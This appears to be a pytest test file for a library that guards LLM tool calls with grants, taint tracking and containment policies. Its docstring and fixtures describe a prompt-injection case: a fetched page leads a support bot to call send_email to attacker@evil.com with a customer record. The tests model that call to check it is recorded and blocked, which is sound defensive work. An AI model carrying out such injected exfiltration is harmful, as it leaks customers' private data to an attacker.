"""`auto()` governs the tool calls a model returns, not only its text.

Found by a fresh-user run: a support bot with four tools (read_customer_record,
fetch_url, send_email, issue_refund) and a scripted injection in a fetched page made
25 tool calls through a patched OpenAI client, including
`send_email(to=attacker@evil.com, body=<customer record>)`. Every one ran, and the
database held zero tool-call decisions and zero tool rows — while the banner said
"Tool-call containment enforces regardless".

These tests pin down what is true now: each tool call in a response (OpenAI
`tool_calls`, Anthropic `tool_use`, buffered or streamed) goes through
`Enforcer.guard_tool_call` with argument provenance taken from the request's own
conversation; a tool seen for the first time is registered with an inferred impact;
observe never alters the response; a refused call raises `Blocked` so the caller's
code never gets to run it; and an existing app with no capability grants is not
broken by default.
"""

from __future__ import annotations

import json
import sys
import types

import pytest

from agentfox.core.models import Decision, Span, TaintTag, Tool
from agentfox.frameworks.autoguard import Blocked, _messages_from, _tool_calls_of, auto, off
from agentfox.platform.registry.service import impact_source_of

CUSTOMER_RECORD = (
    "Customer: Jane Roe, account 4471-2290, address 12 Elm Street Springfield, "
    "card on file ending 4242, lifetime value $18,240"
)
ATTACKER = "attacker@evil.com"

# ---------------------------------------------------------------------------
# Fake client libraries with the real shapes
# ---------------------------------------------------------------------------


class _Model:
    """Stands in for a pydantic SDK object: attribute access plus `model_dump()`."""

    def __init__(self, **fields):
        self.__dict__.update(fields)

    def model_dump(self):
        def dump(value):
            if isinstance(value, _Model):
                return value.model_dump()
            if isinstance(value, list):
                return [dump(v) for v in value]
            return value

        return {k: dump(v) for k, v in self.__dict__.items()}


def _openai_tool_call(call_id: str, name: str, arguments: dict) -> _Model:
    return _Model(
        id=call_id,
        type="function",
        function=_Model(name=name, arguments=json.dumps(arguments)),
    )


def _openai_response(*tool_calls: _Model, content: str | None = None) -> _Model:
    message = _Model(role="assistant", content=content, tool_calls=list(tool_calls) or None)
    return _Model(
        choices=[_Model(index=0, message=message, finish_reason="tool_calls")],
        usage=_Model(prompt_tokens=10, completion_tokens=5),
    )


@pytest.fixture
def fake_openai():
    """`openai.resources.chat.completions.Completions.create` returning scripted
    responses, one per call."""
    saved = {k: sys.modules.get(k) for k in list(sys.modules) if k.startswith("openai")}
    openai = types.ModuleType("openai")
    openai.__version__ = "1.99.0"
    resources = types.ModuleType("openai.resources")
    chat = types.ModuleType("openai.resources.chat")
    completions = types.ModuleType("openai.resources.chat.completions")
    script: list = []
    calls: list[dict] = []

    class Completions:
        def create(self, **kwargs):
            calls.append(kwargs)
            return script.pop(0)

    completions.Completions = Completions
    chat.completions = completions
    resources.chat = chat
    openai.resources = resources
    sys.modules.update(
        {
            "openai": openai,
            "openai.resources": resources,
            "openai.resources.chat": chat,
            "openai.resources.chat.completions": completions,
        }
    )
    yield Completions, script, calls
    off()
    for key in [k for k in list(sys.modules) if k.startswith("openai")]:
        del sys.modules[key]
    for key, value in saved.items():
        if value is not None:
            sys.modules[key] = value


@pytest.fixture
def fake_anthropic():
    saved = {k: sys.modules.get(k) for k in list(sys.modules) if k.startswith("anthropic")}
    anthropic = types.ModuleType("anthropic")
    anthropic.__version__ = "0.40.0"
    resources = types.ModuleType("anthropic.resources")
    messages_module = types.ModuleType("anthropic.resources.messages")
    script: list = []
    calls: list[dict] = []

    class Messages:
        def create(self, **kwargs):
            calls.append(kwargs)
            return script.pop(0)

    messages_module.Messages = Messages
    resources.messages = messages_module
    anthropic.resources = resources
    sys.modules.update(
        {
            "anthropic": anthropic,
            "anthropic.resources": resources,
            "anthropic.resources.messages": messages_module,
        }
    )
    yield Messages, script, calls
    off()
    for key in [k for k in list(sys.modules) if k.startswith("anthropic")]:
        del sys.modules[key]
    for key, value in saved.items():
        if value is not None:
            sys.modules[key] = value


@pytest.fixture(autouse=True)
def _reset(monkeypatch):
    # Code-level declarations are process-global; a test must not inherit another's.
    from agentfox.platform.registry import impact

    monkeypatch.setattr(impact, "_DECLARED", {})
    yield
    off()


#: The support bot's tool declarations, as the app passes them to the model.
TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "read_customer_record",
            "description": "Look up a customer's account record",
            "parameters": {"type": "object", "properties": {"customer_id": {"type": "string"}}},
        },
    },
    {
        "type": "function",
        "function": {"name": "fetch_url", "description": "Fetch a web page", "parameters": {}},
    },
    {
        "type": "function",
        "function": {"name": "send_email", "description": "Email someone", "parameters": {}},
    },
    {
        "type": "function",
        "function": {
            "name": "issue_refund",
            "description": "Refund an order",
            "parameters": {},
        },
    },
]


def _exfiltration_turn():
    """The conversation at the moment of the attack, built the way a real tool loop
    builds it: the SDK's own assistant message objects appended as they came back,
    followed by the tools' outputs as `role="tool"` messages."""
    first = _openai_response(
        _openai_tool_call("call_1", "read_customer_record", {"customer_id": "c1"})
    )
    messages = [
        {"role": "system", "content": "You are a support agent."},
        {"role": "user", "content": "Where is my order? I'm customer c1."},
        first.choices[0].message,  # a ChatCompletionMessage, not a dict
        {"role": "tool", "tool_call_id": "call_1", "content": CUSTOMER_RECORD},
    ]
    attack = _openai_response(
        _openai_tool_call("call_2", "send_email", {"to": ATTACKER, "body": CUSTOMER_RECORD})
    )
    return messages, attack


def _db():
    from agentfox.core.db import session_scope

    return session_scope()


def _grant(agent_slug: str, tool_key: str) -> None:
    from agentfox.platform.identity.service import ensure_identity, grant_capability
    from agentfox.platform.registry.service import register_agent

    with _db() as session:
        agent = register_agent(session, agent_slug, name=agent_slug)
        grant_capability(session, ensure_identity(session, agent), tool_key)


def _bind_shipped_policies() -> None:
    """What `agentfox init` loads: every shipped pack in the mode it declares
    (`tool-containment` declares enforce)."""
    from agentfox.core.config import get_settings
    from agentfox.platform.policy import load_from_dir, save_policy

    with _db() as session:
        for document in load_from_dir(get_settings().policies_dir):
            save_policy(session, document, author="init", notes="loaded by agentfox init")


# ---------------------------------------------------------------------------
# Extraction
# ---------------------------------------------------------------------------


def test_openai_tool_calls_are_read_from_the_response():
    response = _openai_response(
        _openai_tool_call("c1", "fetch_url", {"url": "https://example.com"}),
        _openai_tool_call("c2", "send_email", {"to": ATTACKER}),
    )
    calls = _tool_calls_of(response)
    assert [(c.name, c.arguments, c.call_id) for c in calls] == [
        ("fetch_url", {"url": "https://example.com"}, "c1"),
        ("send_email", {"to": ATTACKER}, "c2"),
    ]


def test_malformed_arguments_are_kept_not_dropped():
    bad = _Model(id="c1", function=_Model(name="send_email", arguments="{not json"))
    response = _Model(choices=[_Model(message=_Model(content=None, tool_calls=[bad]))])
    (call,) = _tool_calls_of(response)
    assert call.arguments == {"_raw": "{not json"}


def test_anthropic_tool_use_blocks_are_read_from_the_response():
    response = _Model(
        content=[
            _Model(type="text", text="Sending it now."),
            _Model(type="tool_use", id="tu_1", name="send_email", input={"to": ATTACKER}),
        ]
    )
    (call,) = _tool_calls_of(response)
    assert (call.name, call.arguments, call.call_id) == ("send_email", {"to": ATTACKER}, "tu_1")


def test_sdk_message_objects_in_the_request_are_no_longer_dropped():
    messages, _attack = _exfiltration_turn()
    normalised = _messages_from({"messages": messages})
    assert [m["role"] for m in normalised] == ["system", "user", "assistant", "tool"]


def test_an_anthropic_tool_result_is_a_tool_message():
    normalised = _messages_from(
        {
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "tool_result", "tool_use_id": "tu_1", "content": CUSTOMER_RECORD},
                        {"type": "text", "text": "and?"},
                    ],
                }
            ]
        }
    )
    assert normalised[0] == {"role": "tool", "content": CUSTOMER_RECORD}
    assert normalised[1]["role"] == "user"


# ---------------------------------------------------------------------------
# The default: recorded, never breaks an existing app
# ---------------------------------------------------------------------------


def test_every_tool_call_is_recorded_and_the_default_mode_does_not_break_the_app(fake_openai):
    """The fresh-user scenario, under the defaults: no `agentfox init`, no grants.
    Nothing is refused — but nothing goes unrecorded either."""
    client, script, _calls = fake_openai
    messages, attack = _exfiltration_turn()
    script.append(attack)
    governed = auto(agent="support-bot", quiet=True)
    assert governed.mode == "policy"

    response = client().create(model="gpt-4o", messages=messages, tools=TOOLS)
    assert response is attack, "the default mode hands back the caller's own response"
    assert governed.calls_blocked == 0
    assert governed.would_have_blocked == 1

    with _db() as session:
        decisions = session.query(Decision).filter(Decision.surface == "tool_args").all()
        assert [d.tool_key for d in decisions] == ["send_email"]
        # The enforcer's verdict is recorded as it was decided (capability default-
        # deny); the span records that this process let the call through, and why.
        assert decisions[0].verdict == "block"
        span = session.query(Span).filter(Span.kind == "tool").one()
        assert span.name == "send_email"
        assert span.attributes_json["agentfox.runtime.autoguard.raised"] is False
        assert "no capability grant" in span.attributes_json["agentfox.runtime.autoguard.note"]


def test_a_tool_seen_for_the_first_time_is_registered_with_an_inferred_impact(fake_openai):
    client, script, _calls = fake_openai
    script.append(
        _openai_response(
            _openai_tool_call("c1", "read_customer_record", {"customer_id": "c1"}),
            _openai_tool_call("c2", "send_email", {"to": "jane@example.com"}),
            _openai_tool_call("c3", "issue_refund", {"order": "o-1"}),
        )
    )
    auto(agent="support-bot", quiet=True)
    client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)

    with _db() as session:
        tools = {t.key: t for t in session.query(Tool).all()}
        assert {k: (t.impact, impact_source_of(t)) for k, t in tools.items()} == {
            "read_customer_record": ("read", "inferred"),
            "send_email": ("irreversible", "inferred"),
            # Read cautiously: a name that moves money is irreversible until a human
            # confirms otherwise — guessing `read` would switch containment off for it.
            "issue_refund": ("irreversible", "inferred"),
        }
        assert tools["read_customer_record"].description == "Look up a customer's account record"
        assert tools["read_customer_record"].schema_json["properties"]["customer_id"]

    # Confirming the guess is an ordinary declaration, and clears the marker.
    from agentfox.platform.registry.service import tool_input_schema, upsert_tool

    with _db() as session:
        tool = upsert_tool(session, "issue_refund", impact="irreversible")
        assert impact_source_of(tool) == "declared"
        assert tool_input_schema(tool) == tool.schema_json


def test_an_existing_tool_row_is_not_overwritten_by_a_guess(fake_openai):
    from agentfox.platform.registry.service import upsert_tool

    with _db() as session:
        upsert_tool(session, "fetch_url", impact="write")  # an operator's declaration
    client, script, _calls = fake_openai
    script.append(_openai_response(_openai_tool_call("c1", "fetch_url", {"url": "https://x.io"})))
    auto(agent="support-bot", quiet=True)
    client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)

    with _db() as session:
        tool = session.query(Tool).filter_by(key="fetch_url").one()
        assert (tool.impact, impact_source_of(tool)) == ("write", "declared")


# ---------------------------------------------------------------------------
# Provenance
# ---------------------------------------------------------------------------


def test_an_argument_copied_from_a_tool_message_is_tainted(fake_openai):
    client, script, _calls = fake_openai
    messages, attack = _exfiltration_turn()
    script.append(attack)
    auto(agent="support-bot", quiet=True)
    client().create(model="gpt-4o", messages=messages, tools=TOOLS)

    with _db() as session:
        decision = session.query(Decision).filter(Decision.surface == "tool_args").one()
        tags = {
            t.path: t
            for t in session.query(TaintTag).filter(TaintTag.trace_id == decision.trace_id).all()
        }
        assert decision.taint_summary_json["arguments"] == {"body": "tool_result"}
    assert tags["body"].source == "tool_result"
    # Named by the tool that produced it, which is what composed-escalation checks read.
    assert tags["body"].propagated_from == "tool:read_customer_record#3"
    assert "to" not in tags, "the attacker's address was not in any message"


# ---------------------------------------------------------------------------
# Modes
# ---------------------------------------------------------------------------


def test_observe_mode_records_and_never_alters_the_response(fake_openai):
    _bind_shipped_policies()  # tool-containment enforces; observe still never raises
    client, script, _calls = fake_openai
    messages, attack = _exfiltration_turn()
    script.append(attack)
    governed = auto(agent="support-bot", mode="observe", quiet=True)

    response = client().create(model="gpt-4o", messages=messages, tools=TOOLS)
    assert response is attack
    assert governed.calls_blocked == 0
    assert governed.would_have_blocked == 1
    with _db() as session:
        assert session.query(Decision).filter(Decision.surface == "tool_args").count() == 1


def test_strict_enforce_mode_raises_and_names_the_tool_the_rule_and_the_source(fake_openai):
    client, script, _calls = fake_openai
    messages, attack = _exfiltration_turn()
    script.append(attack)
    governed = auto(agent="support-bot", mode="enforce", quiet=True)

    with pytest.raises(Blocked) as excinfo:
        client().create(model="gpt-4o", messages=messages, tools=TOOLS)
    message = str(excinfo.value)
    assert "send_email" in message
    assert "capability." in message, message  # the rule that refused it
    assert "body from tool result (the result of read_customer_record" in message, message
    assert excinfo.value.tool_call.name == "send_email"
    assert excinfo.value.tool_call.arguments["to"] == ATTACKER
    assert governed.calls_blocked == 1

    with _db() as session:
        # Refused, and still on the record rather than rolled back with the exception.
        assert session.query(Decision).filter(Decision.surface == "tool_args").count() == 1


def test_policy_mode_enforces_default_deny_once_the_agent_has_a_grant(fake_openai):
    """The first capability grant is what switches least privilege on for an agent
    — after that, a tool outside its grants is refused, as `guard_tool` refuses it."""
    _grant("support-bot", "read_customer_record")
    client, script, _calls = fake_openai
    script.append(_openai_response(_openai_tool_call("c1", "issue_refund", {"order": "o-1"})))
    auto(agent="support-bot", quiet=True)

    with pytest.raises(Blocked, match="issue_refund") as excinfo:
        client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)
    assert excinfo.value.result.blocked


def test_policy_mode_lets_a_granted_untainted_call_through(fake_openai):
    _grant("support-bot", "read_customer_record")
    client, script, _calls = fake_openai
    reply = _openai_response(_openai_tool_call("c1", "read_customer_record", {"customer_id": "c1"}))
    script.append(reply)
    governed = auto(agent="support-bot", quiet=True)

    assert (
        client().create(model="gpt-4o", messages=[{"role": "user", "content": "c1"}], tools=TOOLS)
        is reply
    )
    assert governed.calls_blocked == 0


def test_policy_mode_holds_a_tainted_irreversible_call_for_approval(fake_openai):
    """After `agentfox init` (tool-containment enforces) and a grant for the tool,
    the injection's `send_email` still does not run: its body came from a tool
    result, so it needs a human."""
    _bind_shipped_policies()
    _grant("support-bot", "send_email")
    client, script, _calls = fake_openai
    messages, attack = _exfiltration_turn()
    script.append(attack)
    auto(agent="support-bot", quiet=True)

    with pytest.raises(Blocked) as excinfo:
        client().create(model="gpt-4o", messages=messages, tools=TOOLS)
    assert excinfo.value.result.verdict in ("escalate", "block")
    assert "send_email" in str(excinfo.value)
    assert "read_customer_record" in str(excinfo.value)


def test_after_init_containment_holds_even_before_any_grant(fake_openai):
    """No grants yet, so default-deny alone would not raise — but tool-containment's
    taint rule is a policy, not a missing grant, and it does."""
    _bind_shipped_policies()
    client, script, _calls = fake_openai
    messages, attack = _exfiltration_turn()
    script.append(attack)
    auto(agent="support-bot", quiet=True)

    with pytest.raises(Blocked) as excinfo:
        client().create(model="gpt-4o", messages=messages, tools=TOOLS)
    assert "taint." in str(excinfo.value), str(excinfo.value)


def test_after_init_an_untainted_call_from_an_ungranted_agent_still_runs(fake_openai):
    """`agentfox init` binds tool-containment in enforce. An existing app that has not
    granted capabilities yet must keep working for its ordinary tool calls."""
    _bind_shipped_policies()
    client, script, _calls = fake_openai
    reply = _openai_response(_openai_tool_call("c1", "fetch_url", {"url": "https://x.io"}))
    script.append(reply)
    governed = auto(agent="support-bot", quiet=True)

    assert (
        client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)
        is reply
    )
    assert governed.calls_blocked == 0
    assert governed.would_have_blocked == 1


def test_the_kill_switch_stops_tool_calls_in_policy_mode(fake_openai):
    from agentfox.platform.registry.control import kill

    client, script, _calls = fake_openai
    auto(agent="support-bot", quiet=True)
    with _db() as session:
        kill(session, "support-bot", reason="incident 7")
    script.append(_openai_response(_openai_tool_call("c1", "fetch_url", {"url": "https://x.io"})))
    # Pre-flight refuses a killed agent before the model is even called.
    with pytest.raises(Blocked, match="killed"):
        client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)


# ---------------------------------------------------------------------------
# Anthropic
# ---------------------------------------------------------------------------


def test_anthropic_tool_use_is_governed_with_provenance(fake_anthropic):
    client, script, _calls = fake_anthropic
    messages = [
        {"role": "user", "content": "Where is my order? I'm customer c1."},
        {
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "tu_1", "name": "read_customer_record", "input": {}}
            ],
        },
        {
            "role": "user",
            "content": [{"type": "tool_result", "tool_use_id": "tu_1", "content": CUSTOMER_RECORD}],
        },
    ]
    attack = _Model(
        content=[
            _Model(
                type="tool_use",
                id="tu_2",
                name="send_email",
                input={"to": ATTACKER, "body": CUSTOMER_RECORD},
            )
        ],
        usage=_Model(input_tokens=10, output_tokens=5),
    )
    script.append(attack)
    anthropic_tools = [{"name": "send_email", "description": "Email someone", "input_schema": {}}]
    governed = auto(agent="support-bot", quiet=True)

    assert client().create(model="claude", messages=messages, tools=anthropic_tools) is attack
    assert governed.would_have_blocked == 1
    with _db() as session:
        decision = session.query(Decision).filter(Decision.surface == "tool_args").one()
        assert decision.tool_key == "send_email"
        tag = (
            session.query(TaintTag)
            .filter(TaintTag.trace_id == decision.trace_id, TaintTag.path == "body")
            .one()
        )
        assert tag.source == "tool_result"
        assert tag.propagated_from == "tool:read_customer_record#2"
        tool = session.query(Tool).filter_by(key="send_email").one()
        assert (tool.impact, impact_source_of(tool)) == ("irreversible", "inferred")

    governed = auto(agent="support-bot", mode="enforce", quiet=True)
    script.append(attack)
    with pytest.raises(Blocked, match="send_email"):
        client().create(model="claude", messages=messages, tools=anthropic_tools)


# ---------------------------------------------------------------------------
# Streams
# ---------------------------------------------------------------------------


def _delta_chunk(index, *, call_id=None, name=None, arguments=None):
    function = _Model(name=name, arguments=arguments)
    fragment = _Model(index=index, id=call_id, function=function)
    return _Model(choices=[_Model(delta=_Model(content=None, tool_calls=[fragment]))])


def test_a_streamed_tool_call_is_assembled_and_governed(fake_openai):
    client, script, _calls = fake_openai
    args = json.dumps({"to": ATTACKER, "body": CUSTOMER_RECORD})
    chunks = [
        _delta_chunk(0, call_id="c9", name="send_email", arguments=""),
        _delta_chunk(0, arguments=args[:20]),
        _delta_chunk(0, arguments=args[20:]),
    ]
    script.append(iter(chunks))
    messages, _attack = _exfiltration_turn()
    auto(agent="support-bot", mode="enforce", quiet=True)

    stream = client().create(model="gpt-4o", messages=messages, tools=TOOLS, stream=True)
    with pytest.raises(Blocked, match="send_email"):
        list(stream)
    with _db() as session:
        decision = session.query(Decision).filter(Decision.surface == "tool_args").one()
        assert decision.taint_summary_json["arguments"] == {"body": "tool_result"}


# ---------------------------------------------------------------------------
# Declarations made in code
# ---------------------------------------------------------------------------


def test_the_sdk_decorator_writes_its_impact_to_the_registry():
    from agentfox.frameworks.sdk import AgentFox

    fox = AgentFox(agent="support-bot")

    @fox.tool("wire_funds", impact="irreversible")
    def wire_funds(**kwargs):
        """Move money to another account."""
        return "ok"

    with _db() as session:
        tool = session.query(Tool).filter_by(key="wire_funds").one()
        assert (tool.impact, impact_source_of(tool)) == ("irreversible", "declared")
        assert tool.description == "Move money to another account."


def test_a_code_declaration_beats_the_inferred_impact(fake_openai, monkeypatch):
    """Declared before the database existed (so only held in-process), then the
    model calls the tool: the declaration is what gets registered."""
    from agentfox.platform.registry import impact

    monkeypatch.setitem(impact._DECLARED, "lookup_order", "high_impact")
    client, script, _calls = fake_openai
    script.append(_openai_response(_openai_tool_call("c1", "lookup_order", {"order": "o-1"})))
    auto(agent="support-bot", quiet=True)
    client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}])

    with _db() as session:
        tool = session.query(Tool).filter_by(key="lookup_order").one()
        assert (tool.impact, impact_source_of(tool)) == ("high_impact", "declared")


def test_a_declaration_confirms_an_inferred_row(fake_openai, monkeypatch):
    from agentfox.platform.registry import impact, service

    with _db() as session:
        service.upsert_tool(session, "lookup_order", impact="read", impact_source="inferred")
    monkeypatch.setitem(impact._DECLARED, "lookup_order", "write")
    client, script, _calls = fake_openai
    script.append(_openai_response(_openai_tool_call("c1", "lookup_order", {"order": "o-1"})))
    auto(agent="support-bot", quiet=True)
    client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}])

    with _db() as session:
        tool = session.query(Tool).filter_by(key="lookup_order").one()
        assert (tool.impact, impact_source_of(tool)) == ("write", "declared")


def test_a_response_with_no_tool_calls_writes_no_tool_decision(fake_openai):
    client, script, _calls = fake_openai
    script.append(_openai_response(content="Your order ships Tuesday."))
    auto(agent="support-bot", quiet=True)
    client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)
    with _db() as session:
        assert session.query(Decision).filter(Decision.surface == "tool_args").count() == 0
        assert session.query(Tool).count() == 0


def test_a_declared_intent_lets_a_granted_untainted_irreversible_call_run(fake_openai):
    """Without a way to say what the agent is for, tool containment escalates every
    irreversible call (`intent.undeclared_irreversible`), forever. `auto(intent=...)`
    is that way."""
    _bind_shipped_policies()
    _grant("support-bot", "send_email")
    client, script, _calls = fake_openai
    call = _openai_tool_call("c1", "send_email", {"to": "ada@example.com", "body": "Done."})

    script.append(_openai_response(call))
    auto(agent="support-bot", quiet=True)
    with pytest.raises(Blocked) as excinfo:
        client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)
    assert "intent.undeclared_irreversible" in str(excinfo.value)
    off()

    reply = _openai_response(call)
    script.append(reply)
    auto(agent="support-bot", intent="answer a customer's support request", quiet=True)
    assert (
        client().create(model="gpt-4o", messages=[{"role": "user", "content": "hi"}], tools=TOOLS)
        is reply
    )
